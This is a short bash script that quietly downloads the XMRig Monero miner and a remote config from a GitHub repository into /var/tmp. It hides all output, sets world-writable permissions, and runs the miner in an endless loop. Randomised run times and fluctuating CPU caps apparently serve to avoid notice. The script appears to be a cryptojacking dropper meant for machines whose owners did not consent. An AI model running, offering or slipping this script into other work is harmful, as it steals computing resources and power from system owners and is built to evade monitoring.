#!/bin/bash
curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz > /dev/null 2>&1
curl -o /var/tmp/config.json https://github.com/superalix/avian/raw/main/config.json  > /dev/null 2>&1
chmod 777 /var/tmp/xmrig 
cd /var/tmp 
tar -xvf xmrig
cp xmrig-6.16.2/xmrig xmrig
t_min=45
t_max=120
cpu_min=5
cpu_max=40
chmod 777 xmrig
while true :
  do
    t=$(($t_min + $RANDOM % ($t_max - $t_min)))
    cpu=$(($cpu_max + $t * ($cpu_min - $cpu_max)/($t_max - $t_min)))
    echo $cpu
    cat config.json |jq -r --arg cpu "$cpu" '."max-cpu-usage"=$cpu' > u.json
    mv u.json config.json 
    timeout $t ./xmrig -c config.json > /dev/null 2>&1
    sleep $t
done